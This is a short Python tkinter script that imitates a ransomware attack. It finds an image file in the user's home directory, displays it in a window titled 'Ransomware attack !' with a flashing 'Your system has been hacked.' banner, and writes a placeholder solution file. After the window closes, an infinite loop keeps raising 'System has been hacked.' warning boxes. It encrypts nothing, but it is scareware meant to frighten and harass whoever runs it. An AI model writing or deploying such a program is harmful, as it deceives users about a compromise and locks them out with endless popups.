from tkinter import *
import os
import getpass
from tkinter import messagebox
USER_NAME = getpass.getuser()
start_path = r'C:\Users\%s' % USER_NAME
def file_walker(param):
    global KEY
    for root, dirs, files in os.walk(param):
        for directory in files:
            temp =os.path.join(root, directory)
            if "img4fa92kd.bin" in temp:
                return temp

def path_finder(param):
    path = ""
    param = param.split("\\")
    param = param[:-1]
    for i in param:
        path = path + i + "\\"
    return path

os.chdir(path_finder(file_walker(start_path)))


def create_image():
    with open('img4fa92kd.bin', 'rb') as f:
        binary_data = f.read()
        f.close()
    with open("img4fa92kd.png", "wb") as f:
        f.write(binary_data)
    return "img4fa92kd.png"

flag = False
root = Tk()
root.title("Ransomware attack !")

image_label = Label(root)
image_label.pack()

def load_image(file_name):
    image = PhotoImage(file=file_name)
    image_label.config(image=image)
    image_label.image = image
load_image(create_image())

def solution():
    with open("solution.txt", "w") as s:
        s.write("solution text")
        s.close()

button = Button(image_label, text="Your system has been hacked.", background="#e8081f")
button.config(fg="#3e0727")
button.place(relx=0.5, rely=0.1, anchor=CENTER)
solution()

def change_color():
    global flag
    if flag == False:
        flag = True
        button.config(bg="#e5de00")
    else:
        flag = False
        button.config(bg="#e8081f")
    root.after(500, change_color)
change_color()
root.mainloop()
while True:
    root = Tk()
    root.withdraw()
    messagebox.showwarning("Warning", "System has been hacked.")
#e8081f
#3e0727